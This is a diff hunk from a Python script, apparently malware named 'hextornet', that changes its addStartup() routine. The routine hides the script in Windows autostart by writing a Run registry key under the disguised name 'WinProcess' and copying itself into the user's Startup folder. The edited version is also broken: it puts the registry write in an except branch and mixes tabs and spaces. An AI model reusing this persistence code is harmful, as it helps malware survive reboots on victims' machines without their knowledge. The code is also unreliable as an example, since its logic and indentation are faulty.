@@ -46,16 +46,20 @@ def hide():
 
 
 def addStartup():
-    fp = os.path.dirname(os.path.realpath(__file__))
-    file_name = sys.argv[0].split("\\")[-1]
-    new_file_path = fp + "\\" + file_name
-    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-    key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+	try:
+		
+                fp = os.path.dirname(os.path.realpath(__file__))
+                file_name = sys.argv[0].split("\\")[-1]
+                new_file_path = fp + "\\" + file_name
+                keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+                key2change= OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
 
-    SetValueEx(key2change, "WinProcess", 0, REG_SZ, new_file_path)
-    path = 'C:\\Users\\' +usr+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
-    os.system('copy hextornet.py path')
-    #shutil.move(src, path)
+	except:
+		
+                SetValueEx(key2change, "WinProcess", 0, REG_SZ, new_file_path)
+                path = 'C:\\Users\\' +usr+"\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+                os.system('copy hextornet.py path')
+                #shutil.move(src, path)
 
 
 
